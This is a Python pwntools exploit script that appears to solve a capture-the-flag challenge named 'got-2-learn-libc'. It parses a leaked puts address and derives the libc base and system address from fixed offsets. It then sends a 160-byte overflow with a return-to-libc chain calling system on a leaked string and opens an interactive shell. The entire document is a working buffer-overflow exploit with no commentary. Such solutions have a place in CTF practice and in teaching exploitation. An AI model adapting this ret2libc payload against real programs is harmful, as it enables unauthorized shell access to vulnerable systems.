from pwn import *

def pwn():
    r = process('/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f/vuln')
    r.recvline()
    r.recvline()
    a = r.recvline()
    a = a[6:16]
    log.success('Puts         : '+str(a))
    puts = int(a, 16)
    libc = puts-389440
    sys = libc+239936
    r.recvline()
    r.recvline()
    r.recvline()    
    string = r.recvline()
    string = string[15:25]    
    log.success('Libc base    : '+hex(libc))
    log.success('System       : '+hex(sys))
    log.success('Useful string: '+str(string))
    string = int(string, 16)
    payload = 'A'*160
    payload += p32(sys)
    payload += 'AAAA'
    payload += p32(string)
    r.sendline(payload)
    r.interactive()

pwn()
